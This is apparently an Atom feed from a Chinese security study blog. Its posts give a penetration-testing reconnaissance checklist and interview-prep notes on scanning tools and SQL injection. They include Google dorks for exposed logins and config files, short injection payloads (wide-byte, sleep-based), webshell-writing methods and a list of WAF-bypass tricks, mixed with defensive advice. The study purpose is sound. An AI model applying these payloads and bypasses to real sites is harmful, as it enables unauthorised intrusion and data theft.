<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Scammer</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2023-10-11T05:48:09.470Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Bron</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>渗透测试之信息收集</title>
    <link href="http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2023/10/10/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2023-10-09T16:00:00.000Z</published>
    <updated>2023-10-11T05:48:09.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>渗透之基础。</p><span id="more"></span><h1 id="公司级别（获取目标域名）"><a href="#公司级别（获取目标域名）" class="headerlink" title="公司级别（获取目标域名）"></a>公司级别（获取目标域名）</h1><ol><li><p>得到公司名，使用Google搜索得到官网，官网一般主域名。</p></li><li><p>使用企查查，天眼查，域名备案获取主域名。也可以得到相关身份信息（人名，手机号，邮箱）<br><a href="www.qcc.com">企查查</a>  <a href="https://www.tianyancha.com/">天眼查</a>  <a href="https://www.freebuf.com/sectool/284285.html">境外企业信息查询小工具</a></p></li><li><p>利用whois查询，whois反查获取域名相关信息<br><a href="http://whois.chinaz.com/">站长之家</a><br><a href="https://x.threatbook.cn/">微步</a></p></li><li><p>查看ip信息，有无CDN<br><a href="https://ping.chinaz.com/">站长工具</a><br><a href="https://www.ipshudi.com/">IP反查</a><br><a href="https://www.ssllabs.com/ssltest/analyze.html">SSL Lab查找真实IP</a></p></li></ol><h1 id="域名级别（获取目标子域名）"><a href="#域名级别（获取目标子域名）" class="headerlink" title="域名级别（获取目标子域名）"></a>域名级别（获取目标子域名）</h1><ol><li><p>子域名收集<br>Oneforall - 自动化，收集比较全，使用方便<br>fofa语法: <code>domain=&quot;anikore.jp&quot;</code></p></li><li><p>查旁站<br><a href="https://chapangzhan.com/">查旁站</a><br><a href="https://ipchaxun.com/">ip查询</a><br><a href="https://stool.chinaz.com/same?s=178.79.181.137">站长工具</a></p></li><li><p>Google语法<br>迅速查找信息泄露、管理后台暴露等漏洞语法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">Google hack实战-搜索敏感文件</span><br><span class="line">filetype:txt 登录</span><br><span class="line">filetype:xls 登录</span><br><span class="line">filetype:doc 登录</span><br><span class="line">site:xxx.com filetype:doc intext:pass</span><br><span class="line">site:xxx.com filetype:xsl intext:pass</span><br><span class="line">site:xxx.com filetype:conf</span><br><span class="line">site:xxx.com filetype:inc</span><br><span class="line">filetype:log iserror.log</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Google hack实战-搜索登陆后台</span><br><span class="line">intitle:后台管理</span><br><span class="line">intitle:login</span><br><span class="line">intitle: 后台管理 inurl:admin</span><br><span class="line">intitle:index of /</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle: 后台管理</span><br><span class="line">site:example.com admin</span><br><span class="line">site:example.com login</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 管理</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:xxx.com admin</span><br><span class="line">site:xxx.com login</span><br><span class="line">site:xxx.com 管理</span><br><span class="line">site:example.com system</span><br><span class="line">site:example.com 登录</span><br><span class="line">site:example.com 内部</span><br><span class="line">site:example.com 系统</span><br><span class="line">site:example.com filetype:txt 登录</span><br><span class="line">site:example.com intitle:后台管理</span><br><span class="line">inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line">site:example.com intext:管理|后台|登录|用户名|密码|验证码|系统|账号|admin|login|sys|management|password|username</span><br><span class="line"></span><br><span class="line">Google hack实战-搜索中间件</span><br><span class="line">Weblogic</span><br><span class="line"></span><br><span class="line">inurl:/console/login/LoginForm.jsp site:domian</span><br><span class="line">inurl:/console/login/LoginForm.jsp intitle:Oracle WebLogin Server site:domain</span><br><span class="line">inurl:/console/login/ intitle:&quot;Oracle WebLogin Server 管理控制台&quot; site:domain</span><br><span class="line"></span><br><span class="line">Jboss</span><br><span class="line"></span><br><span class="line">inurl:/jmx-console/htmladaptor site:domain</span><br><span class="line"></span><br><span class="line">Websphere</span><br><span class="line"></span><br><span class="line">inutl:/ibm/console/login.jsp site:domain</span><br></pre></td></tr></table></figure></li></ol><h1 id="IP级别（获取目标IP）"><a href="#IP级别（获取目标IP）" class="headerlink" title="IP级别（获取目标IP）"></a>IP级别（获取目标IP）</h1><ol><li><p>域名转IP<br>可使用在线工具: <a href="https://www.useotools.com/zh/domain-into-ip/output">域名转IP</a></p></li><li><p>C段信息<br>使用cIPR</p></li><li><p>存活探测，端口扫描，常见服务爆破<br>使用fscan</p></li><li><p>查找资产<br>使用fofa，zoomeye等</p></li></ol><h1 id="web级别（获取目标web信息）"><a href="#web级别（获取目标web信息）" class="headerlink" title="web级别（获取目标web信息）"></a>web级别（获取目标web信息）</h1><ol><li><p>识别网站框架cms<br>用插件Wappalyzer</p></li><li><p>路径收集<br>使用dirbuster，御剑等</p></li><li><p>敏感信息收集<br>使用JSFinder</p></li></ol><p>Nessus<br><a href="https://www.cnblogs.com/chenyablog/p/15302755.html">渗透清单1</a><br><a href="https://blog.csdn.net/quandaquan/article/details/126986847">渗透清单2</a><br><a href="https://zhuanlan.zhihu.com/p/325941785">渗透清单3</a></p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>存在输入的地方<br>工具：SQLMAP<br>类型：联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入<br>数据库：MySQL, MSSQL, Oracle</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>etc</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;渗透之基础。&lt;/p&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="信息收集" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之密码学篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-09-04T08:21:33.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>巧妙运用，出神入化。</p><span id="more"></span><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><ol><li><p>常见加密方式</p></li><li><p>AES&#x2F;DES的具体工作步骤</p></li><li><p>RSA算法</p></li><li><p>如何生成一个安全的随机数？</p></li><li><p>在</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;巧妙运用，出神入化。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="密码学" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之工具篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E5%B7%A5%E5%85%B7%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-09-28T08:13:57.561Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工具是兵器，知识是使用方法。</p><span id="more"></span><h1 id="发散提问"><a href="#发散提问" class="headerlink" title="发散提问"></a>发散提问</h1><ol><li><p>你平时使用哪些工具？以及对应工具的特点？</p></li><li><p>使用什么工具来判断系统是否存在后门？</p></li></ol><p>D盾_Web查杀：只支持Windows<br>Sangfor WebShellKiller<br>深信服EDR<br>Web Shell Detector<br><a href="https://bypass007.github.io/Emergency-Response-Notes/Summary/%E7%AC%AC3%E7%AF%87%EF%BC%9A%E5%B8%B8%E8%A7%81%E7%9A%84Webshell%E6%9F%A5%E6%9D%80%E5%B7%A5%E5%85%B7.html">常见的Webshell查杀工具</a></p><h1 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h1><ol><li>有哪些反向代理的工具？</li></ol><p>Nginx: 开源的高性能反向代理服务器，支持负载均衡、缓存、SSL加密等功能，常用于Web服务器、API Gateway等。<br>Apache HTTP Server: 开源的Web服务器，也可以作为反向代理服务器，支持负载均衡、SSL加密、反向代理等功能。<br>HAProxy: 高性能的负载均衡器和反向代理服务器，支持TCP和HTTP协议，可用于HTTP请求的负载均衡、高可用性等场景。<br>Traefik: 基于Go语言开发的现代化反向代理服务器，支持自动发现服务、负载均衡、自动SSL证书管理等功能，常用于Docker容器环境。<br>Envoy: 由Lyft开发的高性能反向代理和边缘代理，支持负载均衡、服务发现、流量管理等功能，常用于微服务环境。</p><h1 id="渗透测试工具"><a href="#渗透测试工具" class="headerlink" title="渗透测试工具"></a>渗透测试工具</h1><ol><li>sqlmap，怎么对一个注入点注入？</li></ol><p>设置指定注入参数：<br><code>-p</code> : 指定参数进行扫描，不是扫描所有参数，提高效率。<br><code>--skip</code> : 跳过指定参数扫描，和 <code>-p</code> 的作用相反，它用来跳过需要扫描的参数。<br><code>--param-exclude</code> : 不对包含具体内容参数的请求进行探测，如不对包含token和session参数的请求进行探测。<br><code>--skip-static</code> : 扫描时忽略非动态参数。</p><p>sqlmap设置url注入位置<br>当注入点在url上时，除非手动将注入点指向URL上，否则sqlmap不会对url路径执行任何自动测试，必须要在扫描时在url上加星号(*)来指定这些注入点。<br><code>python sqlmap.py -u &quot;http://172.17.0.1/Less-1*/?id=1&quot; --banner</code></p><p>sqlmap设置任意注入位置<br>使用星号(*)来指定注入点<br><code>python sqlmap.py -u &quot;http://172.17.0.1/Less-20/?id=1&quot; --cookie=&quot;uname=admin*&quot; --banner</code></p><ol start="2"><li>nmap，扫描的几种方式？</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-sS  SYN扫描，半连接扫描，优点是扫描速度快，不容易被记录，适用于任何兼容TCP堆栈，可以清晰可靠地区分端口开启、关闭和过滤状态。</span><br><span class="line">但需要root权限去构造原始数据包，目前IDS可以检测到这种扫描方式。</span><br><span class="line">-sT  TCP连接扫描，建立完整的连接，会被日志、IDS等记录。</span><br><span class="line">-sA  ACK扫描，适合用来映射防火墙规则。</span><br><span class="line">-sW  Windows扫描，窗口扫描原理与ACK扫描相同，但它会利用系统的实现细节区分端口开放和关闭，而不是都标记为 unfiltered。</span><br><span class="line">-sM  Maimon扫描，以发现者Uriel Maimon命名，使用FIN/ACK数据包为探针。</span><br><span class="line">-sU  UDP扫描，速度很慢，扫描上千个端口需要至少17分钟，多数Linux系统会限制icmp响应速率。</span><br><span class="line">-sN/sF/sX  NULL扫描、FIN扫描、Xmas扫描，设置TCP标志位。</span><br><span class="line">这三种扫描类型（以及--scanflags选项）利用TCP RFC 标准中的细节来区分开放端口和关闭端口，通常只能确定关闭的端口。</span><br><span class="line">-sI  空闲扫描，也有称之为僵尸扫描，利用僵尸主机进行扫描，优点是隐蔽性强，缺点是需要县找一台合适的僵尸主机。</span><br><span class="line">-sY/sZ SCTP INIT/COOKIE-ECHO扫描，这两种扫描方式是基于SCTP协议。</span><br><span class="line">-sO  协议扫描，IP层协议扫描，这不算是端口扫描技术，该扫描技术用于判断目标主机所支持的协议。</span><br></pre></td></tr></table></figure><p><a href="https://www.freebuf.com/sectool/277822.html">一文读懂Nmap的正确使用方法</a></p><ol start="3"><li>用什么扫描端口，目录？</li></ol><p>nmap</p><ol start="4"><li>子域名枚举用过哪些工具，原理是什么，如果出现了任意子域名都返回200是什么原因？</li></ol><p>子域名枚举工具：<br>(1) theHarvester: 原理是利用网络爬虫技术通过不同公开源中（如baidu、google等搜索引擎，PGP服务器、Shodan数据库等）收集e-mail、用户名、主机名、子域名、雇员、开放端口和Banner等信息。<br>(2) Amass: 可以通过遍历等形式爬取数据源和Web文档，或利用IP地址来搜索相关的网块和ASN，并利用所有收集到的信息来构建目标网络拓扑。<br>(3) subDomainsBrute: 高并发的DNS暴力枚举工具, 使用字典，扫描.<br>(4) OneForAll: 利用证书透明度收集子域, 常规检查收集子域, 利用网上爬虫档案收集子域, 利用DNS数据集收集子域, 利用DNS查询收集子域, 利用威胁情报平台数据收集子域, 利用搜索引擎发现子域<br>(5) knock: 通过被动侦察和字典扫描快速枚举目标域上的子域。<br>(6) subfinder: 使用被动在线资源返回网站的有效子域。</p><p>原因：<br>(1) 目标域名使用了CDN<br>(2) 目标域名使用了反向代理<br>(3) 被拦截器拦截<br>(4) 配置了vhost虚拟主机，或进行端口转发，捕获了http请求后设置规则为200</p><ol start="5"><li>后台扫描用什么工具？</li></ol><p>御剑<br>dirbuster<br>Webdirscan、Cansina、Dirsearch、awvs、wwwscan、dirmap</p><ol start="6"><li>御剑有自己的包吗？</li></ol><p>有配置文件</p><ol start="7"><li>burp会哪些模块？</li></ol><p>(1) Dashboard: 主要分为三块：Tasks(任务)、Event log(事件日志)、issue activity(动态发现的问题)<br>(1) Target: 目标工具包含了SiteMap，用你的目标应用程序的详细信息。它可以让你定义哪些对象在范围上为你目前的工作，也可以让你手动测试漏洞的过程，Target分为site map和scope两个选项卡。<br>(2) Proxy: Proxy代理模块作为BurpSuite的核心功能，拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。<br>(3) Spider: Burp Spider 是一个映射 web 应用程序的工具。它使用多种智能技术对一个应用程序的内容和功能进行全面的清查。<br>(4) Scanner: Burp Scanner 是一个进行自动发现 web 应用程序的安全漏洞的工具。它是为渗透测试人员设计的，并且它和你现有的手动执行进行的 web 应用程序半自动渗透测试的技术方法很相似。<br>(5) Intruder: Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。你可以使用 Burp Intruder 方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。<br>(6) Repeater: Burp Repeater 是一个手动修改并补发个别 HTTP 请求，并分析他们的响应的工具。它最大的用途就是和其他 Burp Suite 工具结合起来。你可以从目标站点地图，从 Burp Proxy 浏览记录，或者从 Burp Intruder 攻击结果上的请求，发送到 Repeater 上，并手动调整这个请求来微调对漏洞的探测或攻击。<br>(7) Sequencer: Burp Sequencer是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRF tokens，密码重置tokens等。<br>(8) Decoder: Burp Decoder是Burp Suite中一款编码解码工具，将原始数据转换成各种编码和哈希表的简单工具，它能够智能地识别多种编码格式采用启发式技术。<br>(9) Comparer: Burp Comparer在Burp Suite中主要提供一个可视化的差异比对功能，来对比分析两次数据之间的区别。<br>(10) Extender: Burp在软件中提供了支持第三方拓展插件的功能，方便使用者编写自己的自定义插件或从插件商店中安装拓展插件。<br>(11) Project: Project options主要用来对Project的一些设置。<br>(12) User options: User options模块主要用来配置一些常用的选项。<br><a href="https://blog.51cto.com/u_15275035/2925893">burpsuite十大模块详细功能介绍</a><br><a href="https://blog.51cto.com/sfsec/3802436">Burpsuite各个模块详细使用</a></p><ol start="8"><li>如果不能用awvs和appscan还能怎么办？</li></ol><p>用其它扫描器。Nessus, Xray<br>手工测试。</p><ol start="9"><li><p>msf用过吗</p></li><li><p>msf的木马你知道吗？免杀是怎么做的？</p></li><li><p>内网提权方面 土豆知道原理吗？</p></li><li><p>工作中用过哪些扫描器，这些扫描器都有哪些优缺点？</p></li><li><p>burp如何破解md5加密密码或base64加密密码？</p></li><li><p>kali上，最常用的哪几个工具？</p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;工具是兵器，知识是使用方法。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="工具" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之流量篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E6%B5%81%E9%87%8F%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8B%E6%B5%81%E9%87%8F%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-09-03T09:15:15.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>监控流量，就知道方向。</p><span id="more"></span><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><ol><li>wireshark简单的过滤规则</li></ol><h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1><ol><li>简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;监控流量，就知道方向。&lt;/p&gt;</summary>
    
    
    
    <category term="面试" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    <category term="流量" scheme="http://example.com/categories/%E9%9D%A2%E8%AF%95/%E6%B5%81%E9%87%8F/"/>
    
    
    <category term="面试" scheme="http://example.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>面试准备之web漏洞篇</title>
    <link href="http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8Bweb%E6%BC%8F%E6%B4%9E%E7%AF%87/"/>
    <id>http://example.com/2023/09/03/%E9%9D%A2%E8%AF%95%E5%87%86%E5%A4%87%E4%B9%8Bweb%E6%BC%8F%E6%B4%9E%E7%AF%87/</id>
    <published>2023-09-02T16:00:00.000Z</published>
    <updated>2023-10-07T12:32:49.816Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>可以不用，但不能没有。</p><span id="more"></span><h1 id="SQL注入与其它注入"><a href="#SQL注入与其它注入" class="headerlink" title="SQL注入与其它注入"></a>SQL注入与其它注入</h1><ol><li>如何判断sql注入，有哪些方法？</li></ol><p>(1) 判断注入点是否存在。看页面的url是否存在某些参数，然后通过改变，把值变为 +1、-1、9999、1’、1” 等等，查看页面是否有异常变化。<br>(2) 尝试是否有宽字节注入。查看页面编码格式是否为GBK，如果是可以尝试用 <code>1%df&#39;</code> 查看页面变化。<br>(3) 尝试是否有二次注入。先将正常数据写入数据库，然后查看能否带出。<br>(4) 尝试能否从User-Agent, Referer, Cookie等地方注入。使用burp修改参数。<br>(4) 使用sqlmap检测。<br>(4) 通过DNSlog判断是否有传回值。</p><ol start="2"><li>如何判断sql注入漏洞成因？如何防范？注入方式有哪些？除了数据库数据，利用方式还有哪些？</li></ol><p>当程序执行访问某些表等操作都会执行到sql语句进行调用，如果在此调用过程中，提交了不合法的数据，而数据库无法识别会报错。也就是一切数据都是有害的。<br>注入类型：联合，报错，二次，宽字节，布尔盲注，时间盲注，堆叠注入。<br>注入提交方式：GET, POST, User-Agent, Referer, Cookie, 文件头<br>利用方式：主要看数据库类型，如sqlserver可以进行命令执行，MySQL写shell有些可以执行命令环境要在Linux下。<br>防范： 1. 使用预编译语句。使用PDO需要注意不要将变量直接拼接到PDO语句中。所有查询语句都使用数据库提供的参数化查询接口，参数化语句使用参数而不是将用户输入变量嵌入到SQL语句中。2. 过滤特殊字符。对特殊字符编码或转义。3. 代码层要统一。尽量为utf-8，以免由于编码方式不同造成过滤模型被绕过。4. 数据类型要严格明确。如果是数字型就不允许输入数字以外的字符，在数据库中类型要明确为int。5. 严格限制网站用户的数据库操作权限。给用户提供仅仅能满足其工作的权限，从而最大限度地减少注入攻击对数据库的危害。6. 数据长度应该严格规定。能在一定程度上防止比较长的注入语句无法正确执行。7. 避免网站显示SQL错误信息，比如类型错误，字段不匹配等，防止攻击者利用这些错误信息进行一些判断。8. 过滤危险字符，例如：采用正则表达式匹配union, sleep, and, select, load_file等关键字，如果匹配到则终止运行。<br>加CDN，套waf</p><ol start="3"><li>为什么有的时候没有错误回显？</li></ol><p>没有进行错误打印或错误屏蔽</p><ol start="4"><li>宽字节注入原理？如何利用宽字节注入漏洞？payload如何构造？</li></ol><p>宽字节注入的关键是GBK编码，窄字节占1位，宽字节占2位。利用字符组合形成宽字节，使目标字符逃逸。<br>payload构造方式： <code>?id=1%df&#39;</code> </p><ol start="5"><li>mysql的网站注入，5.0以上与5.0以下有什么区别？</li></ol><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。<br>5.0以下是多用户单操作，5.0以上是多用户多操作。</p><ol start="6"><li>mysql的用户名密码是存放在哪张表里？mysql密码采用哪种加密方式？</li></ol><p>存放的表：mysql-&gt;users<br>加密方式：SHA1</p><ol start="7"><li>mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</li></ol><p>root权限，网站的绝对路径</p><ol start="8"><li>SQL头注入点</li></ol><p>User-Agent, Referer, Cookie, X-FOR-I</p><ol start="9"><li>mysql写shell有几种方法</li></ol><p>outfile, dumpfile, 开启log写webshell</p><ol start="10"><li>如何突破注入时字符被转义？</li></ol><p>如果可以用宽字节注入，hex编码绕过</p><ol start="11"><li>注入时可以不用 and 或 or 或 xor，直接order by开始注入吗？</li></ol><p>and or xor只是用来判断该处是否存在注入点的方式，如果知道了该处有注入点就不需要了。</p><ol start="12"><li>sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由。<br>A. demo.jsp?id&#x3D;2+1<br>B. demo.jsp?id&#x3D;2-1</li></ol><p>B。在url编码中，“+”代表空格，可能会造成混淆。</p><ol start="13"><li>以下链接存在sql注入漏洞，对于这个变形注入，你有什么思路？<br><code>demo.do?DATA=AjAxNg==</code></li></ol><p><code>AjAxNg==</code> 通过base64解码可得到 <code>016</code><br>注入操作不变，对参数进行base64编码即可。</p><ol start="14"><li>sql注入的几种类型？</li></ol><p>SQL注入的类型：<br>联合注入，报错注入，布尔盲注，时间盲注，二次注入，宽字节注入，堆叠注入。</p><ol start="15"><li>报错注入函数有哪些？10个</li></ol><p>updatexml, extractvalue, floor, exp, geometrycollection, multipoint, polygon, multipolygon, linestring, multilinestring</p><ol start="16"><li>延时注入如何来判断？</li></ol><p>使用函数sleep()，如果页面有延迟，说明存在延时注入。或者使用sqlmap检测。<br>具体语句： <code>if(ascii(substr(&quot;hello&quot;,1,1))=104,sleep(5),1)</code></p><ol start="17"><li>盲注和延时注入的共同点？</li></ol><p>都是由于没有报错回显，一个字符一个字符地判断对错的手段。</p><ol start="18"><li>sql注入写文件都有哪些函数？</li></ol><p>sql注入写文件的函数：<br>into outfile–能写入多行，按格式输出<br>into dumpfile–只能写入一行，没有输出格式</p><ol start="19"><li>sql注入防护方法？</li></ol><p>使用安全的API，对输入特殊字符进行转义处理，白名单规范化输入验证方法，客户端输入控制不允许输入SQL注入相关的特殊字符，服务端在提交数据进行SQL查询之前，对特殊字符进行过滤转义替换删除。</p><ol start="20"><li>注入有防护怎么办？</li></ol><p>绕过：<br>(1) 使用编码绕过（如：url编码，二次url编码，Unicode编码，base64编码，hex编码，ascii编码）<br>(2) 字母大小写转换绕过<br>(3) 空格过滤绕过（如‘+’号代替空格，空白符，注释符&#x2F;**&#x2F;绕过）<br>(4) 双关键字绕过<br>(5) 内联注释绕过(在MySQL里，/**/是多行注释，这个是SQL的标准，但是MySQL扩张了解释的功能，如果在开头的的/*后头加了惊叹号（/*!50001sleep(3)*/），那么此注释里的语句将被执行。)<br>(6) 请求方式差异规则松懈性绕过（有些WAF同时接收GET方法和POST的方法，但只在GET方法中增加了过滤规则，可通过发送POST方法进行绕过。）<br>(7) 异常method绕过（有些WAF只检测GET，POST方法，可通过使用异常方法进行绕过。）<br>(8) 超大数据包绕过（部分WAF只检测固定大小的内容，可通过添加无用字符进行绕过检测）<br>(9) 复参数绕过（在提交的URL中给一个参数多次赋不同的值 <code>?id=1&amp;id=2</code> , 部分WAF在处理的过程中可能只处理前面提交的参数值，而后端程序在处理的时候可能取的是最后的值）<br>(10) 添加%绕过过滤（将WAF中过滤的敏感字符通过添加%绕过过滤。如 sel%ect）<br>(11) 协议未覆盖绕过（部分WAF可能只对一种content-type类型增加了检测规则，可以尝试互相替换去掉WAF过滤机制。）<br>(12) 宽字节绕过（宽字节注入是因为使用了GBK编码。）<br>(13) %00截断<br>(14) Cookie&#x2F;X-Forwarded-For注入绕过（部分WAF可能只对GET，POST提交的参数进行过滤，未对Cookie或者X-Forwarded-For进行检测，可通过cookie或者X-Forwarded-For提交注入参数语句进行绕过。）<br>(15) 利用pipline绕过（当请求中的Connection字段值为keep-alive，则代表本次发起的请求所建立的tcp连接不断开，直到所发送内容结束Connection为close为止。部分WAF可能只对第一次传输过来的请求进行过滤处理。）<br>(16) 利用分块编码传输绕过（分块传输编码是HTTP的一种数据传输机制，允许将消息体分成若干块进行发送。当数据请求包中header信息存在Transfer-Encoding: chunked，就代表这个消息体采用了分块编码传输。）<br>(17) 冷门函数&#x2F;字符&#x2F;运算符绕过（如： Sleep()  &#x3D;&#x3D;&gt; benchmark()）</p><p><a 